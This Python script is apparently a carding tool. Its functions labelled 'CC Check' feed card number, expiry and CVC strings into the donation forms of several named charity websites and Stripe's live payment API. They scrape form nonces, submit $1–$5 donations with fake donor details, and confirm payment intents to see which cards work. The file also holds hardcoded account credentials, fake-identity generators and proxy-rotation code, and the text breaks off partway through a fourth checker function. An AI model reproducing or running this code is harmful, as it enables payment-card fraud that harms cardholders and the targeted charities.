import random
import string
import requests
from user_agent import generate_user_agent
import json
import re

# ============================= Proxy
def get_random_proxy(filename="proxy2.txt"):
    # proxy.txt
    with open(filename, "r", encoding="utf-8") as f:
        proxy = f.read().strip()

    ip, port, username, password = proxy.split(':')
    proxy_auth = f"http://{username}:{password}@{ip}:{port}"
    print(f"Using BrightData proxy: {proxy_auth}")
    return {"http": proxy_auth, "https": proxy_auth}
    
#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
import itertools

userpass_list = [
    "zone215@outlook.com|dkxjdj8hdbdb",
    "Zaroj|dkxjdj8hdbdb",
    "anni|dkxjdj8hdbdb",
    "jobi|dkxjdj8hdbdb",
    "xiaoAn|dkxjdj8hdbdb",
    "akumi|dkxjdj8hdbdb",
    "fang|dkxjdj8hdbdb",
    "zikosa|dkxjdj8hdbdb",
]

cyclic_accounts = itertools.cycle(userpass_list)

def get_next_credentials():
    creds = next(cyclic_accounts)
    username, password = creds.split('|')
    # print(f"Using Account: {username} and {password}")
    return username, password

#===========================================
# --- Main CC Check Function ---
def go0(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://flyingislandspocketpoets.com.au/campaigns/flying-islands-poetry-community-gift-fund/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G0 ID Response: {form_id}")
        print(f"G0 ID Response: {donation_nonce}")
        print(f"G0 ID Response: {campaign_id}")
        print(f"G0 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fflyingislandspocketpoets.com.au&time_on_page=18857&client_attribution_metadata[client_session_id]=db59f604-f124-4073-a15e-ce97a8940cb3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PwdsiB5eoqvSHOqyyHi6L4FRsmjdW4ItwjqokSEb553bHcI740aS58rHySVqzFUodW0yJ3Dt7XbvlnahfqRaq2Y000C03lovP'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G0 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'pmpro_visit': '1',
    'charitable_session': 'd021b409b9e3533e2350a25b9065b586||86400||82800',
    '_ga': 'GA1.1.340278551.1766037884',
    '_ga_JN189FD1FZ': 'GS2.1.s1766037883$o1$g1$t1766037889$j54$l0$h0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-18%2005%3A34%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2F',
    'sbjs_first_add': 'fd%3D2025-12-18%2005%3A34%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2Fdonate%2F',
    '__hstc': '149861929.74912fb5b00ffcd5de31f7116d2d5c55.1766037899096.1766037899096.1766037899096.1',
    'hubspotutk': '74912fb5b00ffcd5de31f7116d2d5c55',
    '__hssrc': '1',
    '__hssc': '149861929.1.1766037899098',
    '__stripe_mid': '47d1feea-5799-4e3a-a1b2-921b4859ff086afeff',
    '__stripe_sid': 'f2a61ab8-3b3f-40b6-a495-2ec36d7efe05bc6d3b',
        }
        headers = {
    'authority': 'flyingislandspocketpoets.com.au',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://flyingislandspocketpoets.com.au',
    'pragma': 'no-cache',
    'referer': 'https://flyingislandspocketpoets.com.au/campaigns/flying-islands-poetry-community-gift-fund/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/flying-islands-poetry-community-gift-fund/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Flying Islands Poetry Community Inc Tax Deductible Gift Fund',
    'ID': f'{donation_id}',
    'donation_amount': 'custom',
    'custom_donation_amount': '2.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://flyingislandspocketpoets.com.au/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51PwdsiB5eoqvSHOqyyHi6L4FRsmjdW4ItwjqokSEb553bHcI740aS58rHySVqzFUodW0yJ3Dt7XbvlnahfqRaq2Y000C03lovP',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
        
#============================================
# --- Main CC Check Function ---
def go1(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://hilosailing.org/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G1 ID Response: {form_id}")
        print(f"G1 ID Response: {donation_nonce}")
        print(f"G1 ID Response: {campaign_id}")
        print(f"G1 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fhilosailing.org&time_on_page=33155&client_attribution_metadata[client_session_id]=708f32a5-a9d4-4916-a50a-3e1a1754c059&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51ON1uXBfuAdQ8FlJOfl7hiPy65S9zGjDTAtgRl4LGof7XeUUlIwgwr8CqCx3ATxiTM9f4jcYfoeepYeVF7if8no800V2EvdSnT'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G1 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'pmpro_visit': '1',
    'charitable_session': 'e612b40e768f885b1e25d5a120def5b6||86400||82800',
    '__stripe_mid': 'de3a8236-2406-41f1-8ac1-deec1ca17a69e3d243',
    '__stripe_sid': 'c064e056-6e5a-4a8f-a268-5cecea19ef6c140bd4',
    'holler-page-views': '1',
        }
        headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9,my;q=0.8',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://hilosailing.org',
    'Pragma': 'no-cache',
    'Referer': 'https://hilosailing.org/donate/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'user-agent': user,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Donation Page',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '5.00',
    'recurring_donation': 'once',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'stripe_payment_method': f'{pm}',
    'cover_fees': '1',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://hilosailing.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51ON1uXBfuAdQ8FlJOfl7hiPy65S9zGjDTAtgRl4LGof7XeUUlIwgwr8CqCx3ATxiTM9f4jcYfoeepYeVF7if8no800V2EvdSnT',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 


#============================================
# --- Main CC Check Function ---
def go2(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get(
        'https://handsforcharity.ca/mississauga/', 
        headers=headers,        
        )
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G2 ID Response: {form_id}")
        print(f"G2 ID Response: {donation_nonce}")
        print(f"G2 ID Response: {campaign_id}")
        print(f"G2 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fhandsforcharity.ca&time_on_page=19233&client_attribution_metadata[client_session_id]=ba7529d6-35df-4b9d-9bf4-b5b33c2d6fa6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51KrzE2BwNF8aAhcXn8Y4IpKMhv8UVGt3xCtKCghxnfN5lTc3diGdP0hbgeLoSZZlaw19n9hKhwAjU9VuEjTNLVaN00LyWbV8ko'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G2 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': '591dec15-1cbf-485e-9305-06cb6c9f8ad996786f',
    'charitable_session': '572bb91f5c034222aba4977239d6d8e3||86400||82800',
    '__stripe_sid': '84b30437-671b-4962-8ea7-ffc7a69dd6feacf664',
        }
        headers = {
    'authority': 'handsforcharity.ca',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://handsforcharity.ca',
    'pragma': 'no-cache',
    'referer': 'https://handsforcharity.ca/mississauga/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/mississauga/',
    'campaign_id': f'{campaign_id}',
    'description': 'H4C Mississauga Fundraising',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'anonymous_donation': '1',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://handsforcharity.ca/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51KrzE2BwNF8aAhcXn8Y4IpKMhv8UVGt3xCtKCghxnfN5lTc3diGdP0hbgeLoSZZlaw19n9hKhwAjU9VuEjTNLVaN00LyWbV8ko',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
                                    
#============================================
# --- Main CC Check Function ---
def go3(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://moffittlegacyfoundation.org/give/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G3 ID Response: {form_id}")
        print(f"G3 ID Response: {donation_nonce}")
        print(f"G3 ID Response: {campaign_id}")
        print(f"G3 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
